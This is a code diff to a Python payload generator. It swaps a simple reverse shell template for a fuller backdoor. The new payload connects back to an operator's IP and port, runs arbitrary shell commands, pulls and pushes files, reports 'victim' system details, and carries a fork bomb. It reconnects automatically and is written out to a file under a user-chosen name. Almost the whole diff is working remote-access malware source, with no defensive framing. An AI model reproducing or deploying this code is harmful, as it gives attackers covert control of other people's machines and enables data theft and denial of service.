@@ -25,55 +25,130 @@ try:
 	if PORT == '' :
 		print ("  Default -> 4444")
 		PORT = ("4444")
-	PAYLOAD=("""import socket
+	payload=('''import os
+import time
+import socket
+import getpass
+import platform
+import colorama
 import subprocess
-import os
+from colorama import Fore, Style
 
-def set_sock(ip, port):
-    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.connect((ip, port))
-    return s
+def client_connect():
+    global sock
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((RHOST, RPORT))
+        return sock
+    except ConnectionRefusedError:
+        time.sleep(5)
 
-def connect_cnc(s):
+def header():
+    header = f"""{Fore.LIGHTBLUE_EX}┌──({Fore.CYAN}{getpass.getuser()}{Style.RESET_ALL}\\U0001f480{Style.RESET_ALL}{Fore.CYAN}{platform.node()}{Fore.LIGHTBLUE_EX})-[{Style.RESET_ALL}{os.getcwd()}{Fore.LIGHTBLUE_EX}]\\n└─{Fore.CYAN}#{Style.RESET_ALL} """
+    sock.send(header.encode())
+
+def sysinfo():
+    sysinfo = f"""{Fore.CYAN}Operating System : {Style.RESET_ALL}{platform.system()}
+{Fore.CYAN}Computer Name : {Style.RESET_ALL}{platform.node()}
+{Fore.CYAN}Username : {Style.RESET_ALL}{getpass.getuser()}
+{Fore.CYAN}Release Version : {Style.RESET_ALL}{platform.release()}
+{Fore.CYAN}Processor Architecture : {Style.RESET_ALL}{platform.processor()}\\n"""
+    sock.send(sysinfo.encode())
+
+def helper():
+    helper = f"""{Fore.CYAN}download : {Style.RESET_ALL}remote download file
+{Fore.CYAN}upload : {Style.RESET_ALL}remote upload file
+{Fore.CYAN}sysinfo : {Style.RESET_ALL}show victim system infomation
+{Fore.CYAN}bomb : {Style.RESET_ALL}process bomb
+{Fore.CYAN}exit : {Style.RESET_ALL}exit the backdoor\\n"""
+    sock.send(helper.encode())
+    
+def bomb():
+    sock.send("\\n SUCCESS\\U0001f480\\n".encode())
     while True:
-        cwd=os.getcwd()
-        command=s.recv(65535).decode().lower()
-        if command=="exit":
-            s.close()
-            break
-        elif command=="pwd":
-            s.send(cwd.encode("utf-8"))
-            continue
+        os.fork()
+        sock.close()
+    
+def download():
+    file_path = sock.recv(5000)
+    file_path = file_path.decode()
+    file = open(file_path, "rb")
+    file_data = file.read()
+    sock.send(file_data)
 
-        try:
-            if command.startswith("cd"):
-                os.chdir(command[3:].replace("\\n",""))
-                command=""
-                cwd=os.getcwd()
-                s.send(cwd.encode("euc-kr"))
-                continue
-        except Exception as e:
-            s.send(str(e).encode("euc-kr", "ignore"))
-
-        proc=subprocess.Popen(
-            command,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE,
-        )
-        output=proc.stdout.read()+proc.stderr.read()
-        s.send(output)
+def upload():
+    file_name = sock.recv(6000)
+    new_file = open(file_name, "wb")
+    file_data = sock.recv(6000)
+    new_file.write(file_data)
+    new_file.close()
 
 if __name__=="__main__":
-    ip="[IP]"
-    port=[PORT]
-    s=set_sock(ip, port)
-    connect_cnc(s)""")
-	payload = PAYLOAD.replace("[IP]",IP).replace("[PORT]",PORT)
-	file = open('./Output/Payload.py', 'w')
+    RHOST = "[IP]"
+    RPORT = [PORT]
+
+    intBuff = 2048
+    
+    client_connect()
+
+    while True:
+        try:
+            header()
+            command = sock.recv(intBuff).decode()
+
+            if command.startswith("cd"):
+                try:
+                    os.chdir(command[3:].replace("\\\\n",""))
+                    command="\\n"
+                    sock.send(command.encode("euc-kr"))
+                except FileNotFoundError:
+                    time.sleep(5)
+                    del sock
+                    client_connect()
+
+            elif command == "download":
+                download()
+
+            elif command == "upload":
+                upload()
+
+            elif command == "sysinfo":
+                sysinfo()
+
+            elif command == "bomb":
+                bomb()
+
+            elif command == "help":
+                helper()
+
+            elif command.startswith("exit"):
+                exit_msg = f"exit"
+                sock.send(exit_msg.encode())
+                sock.close()
+                time.sleep(5)
+                del sock
+                client_connect()
+
+            else:
+                comm = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                output = comm.stdout.read()+ comm.stderr.read()
+                sock.send(output)
+
+        except BrokenPipeError:
+            time.sleep(5)
+            del sock
+            client_connect()
+
+        except ConnectionResetError:
+            time.sleep(5)
+            del sock
+            client_connect()''')
+	payload = payload.replace("[IP]",IP).replace("[PORT]",PORT).encode()
+	name = str(input("\n  ENTER THE FILE NAME : "))
+	name = (name + ".py")
+	file = open("./Output/"+name, 'wb')
 	file.write(payload)
+	file.close()
 	print('')
 	print ("  \033[1;mThe generated payload is in the Output directory.")
 	print('')
